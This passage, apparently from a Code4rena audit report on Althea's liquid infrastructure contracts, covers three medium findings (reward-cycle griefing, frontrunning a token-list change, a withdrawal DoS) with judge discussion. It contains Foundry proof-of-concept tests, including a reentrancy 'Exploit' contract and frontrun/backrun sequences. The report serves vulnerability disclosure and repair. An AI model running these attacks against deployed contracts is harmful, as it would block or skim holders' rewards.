**[SovaSlava (warden) commented](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/703#issuecomment-1986367247):**
 > I think this is not a valid issue, because function `disapproveHolder()` is intended to limit the user's receipt of rewards and this is intended.
> 
> To completely remove a user from the project and prevent him from receiving rewards, the owner must burn the user's tokens. The `disapproveHolder` function is not enough for this and the owner must know this.
> 
> Owner could just call function `burnFromAndDistribute()` and `disapproveHolder()` in one tx.


**[sl1 (warden) commented](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/703#issuecomment-1986780508):**
 > > Owner could just call function `burnFromAndDistribute()` and `disapproveHolder()` in one tx.
> 
> Just as a note, `burnFromAndDistribute()` requires allowance, so it will be impossible for owner to just burn user's tokens.


**[0xA5DF (judge) commented](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/703#issuecomment-1986810526):**
 > 1. The sponsor confirmed this is not the intended design.
> 2. The current design doesn't actually reserve the reward for the disapproved holder, the remaining balance would be distributed in the next cycle to all holders equally.
> 
> Maintaining medium severity.

***

## [[M-02] Malicious users can prevent holders from claiming their rewards during a reward cycle by skipping it.](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/119)
*Submitted by [Fassi\_Security](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/119), also found by [max10afternoon](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/218), [0xJoyBoy03](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/594), and [web3pwn](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/227)*

The Sponsors noted via discord communication:

    "The most likely configuration would be roughly weekly or monthly, based on average block times."

    "Althea-L1 will have a mempool, ..."

This is important to mention because this issue would not be significant if the minimum time between reward distribution was, for example, 100 blocks; and since there is a mempool, front-running is possible.

The project holds liquid NFTs, which accumulate rewards. These rewards are used to reward the `erc20` token holders.
These rewards are transferred to the `liquiderc20` contract by using the two following functions:

```javascript
	 function withdrawFromAllManagedNFTs() public {
        withdrawFromManagedNFTs(ManagedNFTs.length);
    }
    function withdrawFromManagedNFTs(uint256 numWithdrawals) public {
        require(!LockedForDistribution, "cannot withdraw during distribution");
        if (nextWithdrawal == 0) {
            emit WithdrawalStarted();
        }
        uint256 limit = Math.min(
            numWithdrawals + nextWithdrawal,
            ManagedNFTs.length
        );
        uint256 i;
        for (i = nextWithdrawal; i < limit; i++) {
            LiquidInfrastructureNFT withdrawFrom = LiquidInfrastructureNFT(
                ManagedNFTs[i]
            );
            (address[] memory withdrawERC20s, ) = withdrawFrom.getThresholds();
            withdrawFrom.withdrawBalancesTo(withdrawERC20s, address(this));
            emit Withdrawal(address(withdrawFrom));
        }
        nextWithdrawal = i;
        if (nextWithdrawal == ManagedNFTs.length) {
            nextWithdrawal = 0;
            emit WithdrawalFinished();
        }
    }
```

However, the problem here is the following check inside `withdrawFromManagedNFTs`:

```javascript
require(!LockedForDistribution, "cannot withdraw during distribution");
```

Even when there are `0` rewards in the current contract, a malicious user can still call `distribute(1)` to start the distribution process and to set the `LockedForDistribution` boolean to `true`.

This results in no one being able to call `withdrawFromManagedNFTs` to get the rewards inside the `erc20` contract to distribute, which results in the next reward cycle being after `block.number + MinDistributionPeriod`.

### Proof of Concept

There are roughly [7000 blocks per day](https://ycharts.com/indicators/ethereum_blocks_per_day), so we will use `(7000 * 30) = 210000 blocks` to mock a distribution period of roughly 1 month.

We have written a Proof of Concept using Foundry, please follow the instructions provided and read the comments in the PoC for documentation.

<details>

```javascript
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.12;
// git clone https://github.com/althea-net/liquid-infrastructure-contracts.git
// cd liquid-infrastructure-contracts/
// npm install
// forge init --force
// vim test/Test.t.sol 
	// save this test file
// run using:
// forge test --match-test "testGrieveCycles" -vvvv

import {Test, console2} from "forge-std/Test.sol";
import { LiquidInfrastructureERC20 } from "../contracts/LiquidInfrastructureERC20.sol";
import { LiquidInfrastructureNFT } from "../contracts/LiquidInfrastructureNFT.sol";
import { TestERC20A } from "../contracts/TestERC20A.sol";
import { TestERC20B } from "../contracts/TestERC20B.sol";
import { TestERC20C } from "../contracts/TestERC20C.sol";
import { TestERC721A } from "../contracts/TestERC721A.sol";

contract ERC20Test is Test {
    LiquidInfrastructureERC20 liquidERC20;
    TestERC20A erc20A;
    TestERC20B erc20B;
    TestERC20C erc20C;
    LiquidInfrastructureNFT liquidNFT;
    address owner = makeAddr("Owner");
    address alice = makeAddr("Alice");
    address bob = makeAddr("Bob");
    address charlie = makeAddr("Charlie");
    address delta = makeAddr("Delta");
    address eve = makeAddr("Eve");
    address malicious_user = makeAddr("malicious_user");
    
    function setUp() public {
      vm.startPrank(owner);
      // Create a rewardToken
      address[] memory ERC20List = new address[](1);
      erc20A = new TestERC20A();
      ERC20List[0] = address(erc20A);

      // Create managed NFT
      address[] memory ERC721List = new address[](1);
      liquidNFT = new LiquidInfrastructureNFT("LIQUID");
      ERC721List[0] = address(liquidNFT);

      // Create approved holders
      address[] memory holderList = new address[](5);
      holderList[0] = alice;
      holderList[1] = bob;
      holderList[2] = charlie;
      holderList[3] = delta;
      holderList[4] = eve;

      // Create liquidERC20 and mint liquidERC20 to the approved holders
      liquidERC20 = new LiquidInfrastructureERC20("LiquidERC20", "LIQ", ERC721List, holderList, 210000, ERC20List);
      liquidERC20.mint(alice, 1e18);
      liquidERC20.mint(bob, 1e18);
      liquidERC20.mint(charlie, 1e18);
      liquidERC20.mint(delta, 1e18);
      liquidERC20.mint(eve, 1e18);

      // Add threshold and rewardToken to liquidNFT
      uint256[] memory amountList = new uint256[](1);
      amountList[0] = 100;
      liquidNFT.setThresholds(ERC20List, amountList);
      liquidNFT.transferFrom(owner, address(liquidERC20), 1);

      // Mint 5e18 rewardTokens to liquidNFT
      erc20A.mint(address(liquidNFT), 5e18);
      vm.stopPrank();
    }

    function testGrieveCycles() public {
      // Go to block 210001, call withdrawFromAllManagedNFTs to get the rewards, and distribute everything to bring the token balance of the reward token to 0. This is just a sanity check.
      vm.roll(210001);
      liquidERC20.withdrawFromAllManagedNFTs();
      liquidERC20.distributeToAllHolders();

      // Go to block ((210000 * 2) + 1).
      vm.roll(420001);

	  // Malicious user calls distribute
      // This makes it temporarily unavailable to withdraw the rewards.
      vm.prank(malicious_user);
      liquidERC20.distribute(1);
 
      // Rewards can't be pulled or withdrawn from the ERC20 contract.
      vm.expectRevert();
      vm.prank(owner);
      liquidERC20.withdrawFromAllManagedNFTs();

      // This sets the next reward period to start at ((210000 * 3) + 1).
      vm.startPrank(owner);
      liquidERC20.distributeToAllHolders();
      liquidERC20.withdrawFromAllManagedNFTs();
      vm.stopPrank();

      // Alice tried to get the rewards she had earned but could not get them, even with the rewards being in this contract, because the next reward cycle
      // starts at block ((210000 * 2) + 1).
      vm.expectRevert();
      vm.prank(alice);
      liquidERC20.distributeToAllHolders();
    }
}
```

</details>

As you can see by running our PoC, a whole month of rewards is unable to be claimed by approved holders due to any person calling the distribute function; even if there are `0` rewards currently able to be distributed to the approved holders. For a project that is built upon rewarding its holders at a fixed period of time, this breaks the core functionality of the project.

### Tools Used

Foundry

### Recommended Mitigation Steps

Do not start a distribution cycle if there are no rewards that can be paid out to the approved holders and keep track of the rewards currently held in the `liquidNFT`. Only start reward cycles when this amount that is held in the `liquidNFT` is sent to the `liquidERC20`. This prevents malicious users from sending 1 wei of `rewardTokens` to the `liquidERC20` to maliciously start a distribution cycle.

**[ChristianBorst (Althea) acknowledged and commented via duplicate issue #594](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/594#issuecomment-1974261475):**
> I think this is a valid suggestion but does not pose a risk to the protocol. This could enable a malicious owner (which is already a highly trusted role) to avoid distributing revenue to holders before minting new tokens.
>
> There is no restriction on distribution frequency, a user could call `distributeToAllHolders()` multiple times every single block without withdrawing rewards from the `ManagedNFTs` if they want to pay the gas to do so. Even if a user decides to pay all that gas, nothing is preventing any other accounts from withdrawing rewards from the `ManagedNFTs` and performing yet another distribution to actually distribute the revenue to the holders.
>
> I think that there is an argument to restrict owner misbehavior by forcing withdrawal before distribution, but the recommended mitigation strategy would introduce a new DoS vector to the protocol.

**[0xA5DF (judge) commented via duplicate issue #594](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/594#issuecomment-1976438581):**
> > There is no restriction on distribution frequency, a user could call `distributeToAllHolders()` multiple times every single block.
> 
> There is actually a restriction, you have to wait `MinDistributionPeriod` before calling it again ([code](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/84d65bad60cbc87c73dd43906a6fb46b1ba3830b/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L201-L204)).
> 
> Issue [#119](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/119), is more clear and the mitigation makes more sense (ensuring `withdrawFromManagedNFTs()` was completed before starting distribution). Given that the minimum period is going to be about a week or a month I think this is a valid medium issue.

**[0xA5DF (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/119#issuecomment-1985816209):**
 > Marking as medium, as this is _mostly_ only a temporarily grief of funds, and this would only happen if nobody calls `withdrawFromManagedNFTs()`.

**[bronze_pickaxe (warden) commented](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/119#issuecomment-1986192939):**
 > @0xA5DF - We agree this should be of medium severity because it's a temporary grief of funds.
> 
> As you correctly mentioned in your comment, this only happens if nobody calls `withdrawFromManagedNFTs`. Therefore, we ask you to consider de-duping the following dupes because they both describe another attack path, starting from someone calling `withdrawFromManagedNFTs`:
> - [#594](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/594)
> - [#227](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/227)
> 
> [#594](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/594) and [#227](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/227)  both describe the following attack path in the wrong:
> - calling `withdrawFromManagedNFTs`
> 	- if only one NFT distributes the reward, both these issues are invalid since they will still be fully distributed.
> - calling `distribute()`
> This is not the same as our report since the attack path that leads to skipping a reward cycle with no distribution is:
> - `distribute()`
> - `withdrawFromManagedNFTs`
> There is no mention of calling `distribute()` before `withdrawFromManagedNFTs`.
> 
> [#218](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/218) correctly identified the attack vector of calling `withdrawFromManagedNFTs` and `distribute()` in the wrong order, being:
> 1.` distribute()`
> 2.` withdrawFromManagedNFTs`
> This report correctly mentioned the attack path, unlike the other two.

**[0xA5DF (judge) commented](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/119#issuecomment-1986830696):**
 > I agree that they don't fully identify the impact and don't describe the issue well, but it seems like they're touching on it:
> 
> - Holders must wait for another `MinDistributionPeriod` (30 days) to receive their shares from other assets of `ManagedNFTs`. their assets will freeze for another 30 days.
> 
> - This leads to a scenario where it the user might trigger `withdrawFromManagedNFTs` for a portion of managed NFTs, and then attacker calls distribute which block another call to `withdrawFromManagedNFTs` from finishing its work. That way only partial amount of rewards will be distributed since `withdrawFromManagedNFTs` did not pull all rewards.
> 
> I'll give them partial credit.

***

## [[M-03]  Distribution can be bricked, and double claims by a few holders are possible when owner calls `LiquidInfrastructureERC20::setDistributableERC20s`](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/87)
*Submitted by [nuthan2x](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/87), also found by [SpicyMeatball](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/765), [0x0bserver](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/735), [AM](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/634), [agadzhalov](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/600), [Limbooo](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/599), [offside0011](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/498), [DanielArmstrong](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/494), [aslanbek](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/484), [jesjupyter](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/476), [kartik\_giri\_47538](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/471), [turvy\_fuzz](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/459), [Krace](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/406), [CaeraDenoir](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/398), [JrNet](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/333), [zhaojohnson](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/304), [KmanOfficial](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/293), [pkqs90](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/262), [imare](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/260), [max10afternoon](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/198), [SovaSlava](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/188), [TheSavageTeddy](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/154), [d3e4](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/151), [Meera](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/145), [atoko](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/123), juancito ([1](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/111), [2](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/110)), [Kirkeelee](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/76), [ziyou-](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/47), [csanuragjain](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/22), [kutugu](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/14), and [xchen1130](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/10)*

### Lines of code

<https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L222>

### Impact

Double claim, DOS by bricking distribution, few holders can lose some rewards due to missing validation of distribution timing when owner is calling [LiquidInfrastructureERC20::setDistributableERC20s](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L441-L445).

```solidity
    function setDistributableERC20s(
        address[] memory _distributableERC20s
    ) public onlyOwner {
        distributableERC20s = _distributableERC20s;
    }
```

This issue will be impacted the following ways:

When a new token is accepted by any NFT it should be added as a desirable token, or a new `managerNFT` with a new token, then, [LiquidInfrastructureERC20::setDistributableERC20s](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L441-L445) has to be called to distribute the rewards.

So when the owner calls [LiquidInfrastructureERC20::setDistributableERC20s](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L441-L445) which adds a new token as desired token:

1. **Bricking distribution to holders**: Check the POC for proof. When a new token is added, we can expect revert when:
    - The number of desirable tokens length array is increased.
    - An attacker can frontrun and distribute to only one holder, so `erc20EntitlementPerUnit` is now  changed.
    - Now, the actual owner tx is processed, which increases/decreases the size of `distributableERC20s` array.
    - But now, distribution is not possible because the Out of Bound revert on the distribution function because `distributableERC20s` array is changed, but `erc20EntitlementPerUnit` array size is same before the `distributableERC20s` array is modified.

```solidity
            for (uint j = 0; j < distributableERC20s.length; j++) {
                uint256 entitlement = erc20EntitlementPerUnit[j] *  this.balanceOf(recipient);
                if (IERC20(distributableERC20s[j]).transfer(recipient, entitlement)) {
                    receipts[j] = entitlement;
                }
            }
```

2. **Double claim by a holder**: so some holder can DOS by:
    - A last holder of the 10 [holders array](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L48) frontruns this owner tx (`setDistributableERC20s`) and calls [LiquidInfrastructureERC20::distribute](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L198) with 90% of the holders count as params, so all the rewards of old desirable tokens will be distributed to 9 holders.
    - Now, after the owners action, backruns it to distribute to the last holder, which will also receive new token as rewards.
    - The previous holders can also claim their share in the next distribution round, but the last holder also can claim which makes double claim possible, which takes a cut from all other holders.

3. If owner calls [LiquidInfrastructureERC20::setDistributableERC20s](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L441-L445), which removes some tokens, then any token balance in the contract will be lost until the owner re-adds the token, and it can be distributed again.

All the issues can be countered if the [LiquidInfrastructureERC20::setDistributableERC20s](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L441-L445) is validated to make changes happen only after any potential distributions

### Proof of Concept

The logs of the POC shows the revert `Index out of bounds`:

```sh
    ├─ [24677] LiquidInfrastructureERC20::distribute(1)
    │   ├─ [624] LiquidInfrastructureERC20::balanceOf(0x0000000000000000000000000000000000000002) [staticcall]
    │   │   └─ ← 100000000000000000000 [1e20]
    │   ├─ [20123] ERC20::transfer(0x0000000000000000000000000000000000000002, 500000000000000000000 [5e20])
    │   │   ├─ emit Transfer(from: LiquidInfrastructureERC20: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], to: 0x0000000000000000000000000000000000000002, value: 500000000000000000000 [5e20])
    │   │   └─ ← true
    │   ├─ [624] LiquidInfrastructureERC20::balanceOf(0x0000000000000000000000000000000000000002) [staticcall]
    │   │   └─ ← 100000000000000000000 [1e20]
    │   └─ ← "Index out of bounds"
    └─ ← "Index out of bounds"
```

First, run `forge init --force`, then run `forge i openzeppelin/openzeppelin-contracts@v4.3.1` and modify `foundry.toml` file into below:

```diff
[profile.default]
- src = "contracts"
+ src = "src"
out = "out"
libs = ["lib"]
```

Then, copy the below POC into `test/Test.t.sol` and run `forge t --mt test_POC -vvvv`:

```soldity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.12;


import {Test, console2} from "forge-std/Test.sol";
import {LiquidInfrastructureERC20} from "../contracts/LiquidInfrastructureERC20.sol";
import {LiquidInfrastructureNFT} from "../contracts/LiquidInfrastructureNFT.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";


contract AltheaTest is Test {
    function setUp() public {}


    function test_POC() public {
        // setup
        LiquidInfrastructureNFT nft = new LiquidInfrastructureNFT("LP");
        address[] memory newErc20s = new address[](1);
        uint256[] memory newAmounts = new uint[](1);
       
        ERC20 DAI = new ERC20("DAI", "DAI");
        ERC20 USDC = new ERC20("USDC", "USDC");


        string memory _name = "LP";
        string memory _symbol = "LP";
        uint256 _minDistributionPeriod = 5;
        address[] memory _managedNFTs = new address[](1);
        address[] memory _approvedHolders = new address[](2);
        address[] memory _distributableErc20s = new address[](1);


        _managedNFTs[0] = address(nft);
        _approvedHolders[0] = address(1);
        _approvedHolders[1] = address(2);
        _distributableErc20s[0] = address(DAI);


        newErc20s[0] = address(DAI);
        nft.setThresholds(newErc20s, newAmounts);
        LiquidInfrastructureERC20 erc = new  LiquidInfrastructureERC20(
            _name, _symbol, _managedNFTs, _approvedHolders, _minDistributionPeriod, _distributableErc20s);
        erc.mint(address(1), 100e18);
        erc.mint(address(2), 100e18);


        // issue ==  change in desirable erc20s
        _distributableErc20s = new address[](2);
        _distributableErc20s[0] = address(DAI);
        _distributableErc20s[1] = address(USDC);
        newAmounts = new uint[](2);
        newErc20s = new address[](2);
        newErc20s[0] = address(DAI);
        newErc20s[1] = address(USDC);
        nft.setThresholds(newErc20s, newAmounts);


        deal(address(DAI), address(erc), 1000e18);
        deal(address(USDC), address(erc), 1000e18);
        vm.roll(block.number + 100);


        // frontrun tx
        erc.distribute(1);


        // victim tx
        erc.setDistributableERC20s(_distributableErc20s);


        // backrun tx
        vm.roll(block.number + _minDistributionPeriod);
        vm.expectRevert(); // Index out of bounds
        erc.distribute(1);
    }


}
```

### Tools Used

Foundry testing

### Recommended Mitigation Steps

Modify [LiquidInfrastructureERC20::setDistributableERC20s](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L441-L445) to only change the desirable tokens after a potential distribution for fair reward sharing.

```diff
    function setDistributableERC20s(
        address[] memory _distributableERC20s
    ) public onlyOwner {
+       require(!_isPastMinDistributionPeriod(), "set only just after distribution");
        distributableERC20s = _distributableERC20s;
    }
```

### Assessed type

DoS

**[ChristianBorst (Althea) confirmed via duplicate issue #260](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/260#issuecomment-1973824297)**

**[0xA5DF (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/87#issuecomment-1985892087):**
 > Changing to medium since `setDistributableERC20s()` is a function rarely called. This would only be relevant if we're after minimum distribution period has passed since the last distribution.

**[MrPotatoMagic (warden) commented](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/87#issuecomment-1986269977):**
 > @0xA5DF - I think this issue should be invalid.
> 
> This issue arises solely due to owner misbehaviour/error, which is a centralization risk and should be included in analysis reports. Changing the configuration of distributable ERC20 tokens in the middle of the distribution period is the owner's fault and not expected behaviour.  

**[0xA5DF (judge) commented](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/87#issuecomment-1986786007):**
 > The submission talks about a scenario where the owner sent out the tx when there was no distribution going on and a malicious actor front runs it. This is a likely scenario and isn't due to an error on the admin side (the admin can prevent this by running distribution first, but there's no way for the average admin to guess that running this tx without distributing first would cause any issues). Therefore, I'm maintaining medium severity.

***

## [[M-04] Withdrawal from NFTs can be temporarily blocked](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/82)
*Submitted by [SpicyMeatball](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/82), also found by [SpicyMeatball](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/78), [rokinot](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/752), [PumpkingWok](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/673), [rouhsamad](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/577), [CaeraDenoir](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/460), [nuthan2x](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/431), [web3pwn](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/230), [SovaSlava](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/203), [Krace](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/167), [d3e4](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/148), [Meera](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/144), Breeje ([1](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/133), [2](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/130)), [juancito](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/114), [BowTiedOriole](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/80), [JohnSmith](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/56), and [kutugu](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/15)*

If `nextWithdrawal > ManagedNFTs.length`, the contract won't be able to withdraw revenue from managed NFTs, because `nextWithdrawal` can't reset.

```solidity
        uint256 limit = Math.min(
            numWithdrawals + nextWithdrawal,
            ManagedNFTs.length
        );
        uint256 i;
>>      for (i = nextWithdrawal; i < limit; i++) {
            LiquidInfrastructureNFT withdrawFrom = LiquidInfrastructureNFT(
                ManagedNFTs[i]
            );

            (address[] memory withdrawERC20s, ) = withdrawFrom.getThresholds();
            withdrawFrom.withdrawBalancesTo(withdrawERC20s, address(this));
            emit Withdrawal(address(withdrawFrom));
        }
        nextWithdrawal = i;

>>      if (nextWithdrawal == ManagedNFTs.length) {
            nextWithdrawal = 0;
            emit WithdrawalFinished();
        }
```

### Proof of Concept

How `nextWithdrawal` can become greater than `ManagedNFTs` length? Multiple causes:

- `withdrawFromManagedNFTs` was called for 8 of 10 NFTs, and then 3 NFTs were released.
- Same as above but malicious user frontruns the NFT release with `withdrawFromManagedNFTs` transaction.
- This may not be the case in the current implementation but if `transferFrom` will be switched to `safeTransferFrom`, [as bot finding suggests](<https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/main/4naly3er-report.md#l-1-unsafe-erc20-operations>), [here](<https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/main/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L418>),
the malicious user can call `withdrawFromManagedNFTs` from the ERC721 callback while `ManagedNFTs` length is not updated.

Coded POC for `onERC721Received` callback reentrancy case:

```solidity
import {LiquidInfrastructureERC20, ERC20} from "../contracts/LiquidInfrastructureERC20.sol";
import {LiquidInfrastructureNFT} from "../contracts/LiquidInfrastructureNFT.sol";
import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";

contract Exploit {
    LiquidInfrastructureERC20 target;
    constructor(LiquidInfrastructureERC20 _target) {
        target = _target;
    }
    function onERC721Received(address, address, uint256, bytes memory) public virtual returns (bytes4) {
        // set counter
        target.withdrawFromManagedNFTs(2);
        return this.onERC721Received.selector;
    }
}

contract MockToken is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract C4 is Test {
    LiquidInfrastructureERC20 liqERC20;
    MockToken usdc;
    address alice;
    address bob;
    function setUp() public {
        alice = address(0xa11cE);
        bob = address(0xb0b);
        usdc = new MockToken("USDC", "USDC");
        address[] memory rewards = new address[](1);
        rewards[0] = address(usdc);
        address[] memory approved = new address[](3);
        approved[0] = address(this);
        approved[1] = alice;
        approved[2] = bob;
        address[] memory nfts = new address[](3);
        nfts[0] = address(new LiquidInfrastructureNFT("NAME"));
        nfts[1] = address(new LiquidInfrastructureNFT("NAME"));
        nfts[2] = address(new LiquidInfrastructureNFT("NAME"));
        liqERC20 = new LiquidInfrastructureERC20("LIQ", "LIQ", nfts, approved, 10, rewards);
        for(uint256 i=0; i<nfts.length; i++) {
            usdc.mint(nfts[i], 1_000_000 * 1e18);
            LiquidInfrastructureNFT(nfts[i]).setThresholds(rewards, new uint256[](1));
            LiquidInfrastructureNFT(nfts[i]).transferFrom(address(this), address(liqERC20), 1);
        }
    }

    function testWithdrawDOS() public {
        Exploit exploit = new Exploit(liqERC20);
        address nft = liqERC20.ManagedNFTs(0);
        address toRelease1 = liqERC20.ManagedNFTs(1);
        address toRelease2 = liqERC20.ManagedNFTs(2);

        liqERC20.withdrawFromAllManagedNFTs();
        assertEq(usdc.balanceOf(address(liqERC20)), 3_000_000 * 1e18);
        uint256 balBefore = usdc.balanceOf(address(liqERC20));
        liqERC20.releaseManagedNFT(toRelease2, address(exploit));
        liqERC20.releaseManagedNFT(toRelease1, alice);
        // new rewards are ready
        usdc.mint(nft, 1_000_000 * 1e18);
        liqERC20.withdrawFromAllManagedNFTs();
        uint256 balAfter = usdc.balanceOf(address(liqERC20));
        // 1 mil wasn't withdrawn
        assertEq(balBefore, balAfter);
    }

}
```

### Tools Used

Foundry

### Recommended Mitigation Steps

Consider modifying the check [here](<https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/main/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L382>) to:

```diff
+       if (nextWithdrawal >= ManagedNFTs.length) {
            nextWithdrawal = 0;
            emit WithdrawalFinished();
        }
```

### Assessed type

DoS

**[ChristianBorst (Althea) confirmed via duplicate issue #130](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/130#issuecomment-1973797103)**

***

# Low Risk and Non-Critical Issues

For this audit, 10 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/58) by **ZanyBonzy** received the top score from the judge.

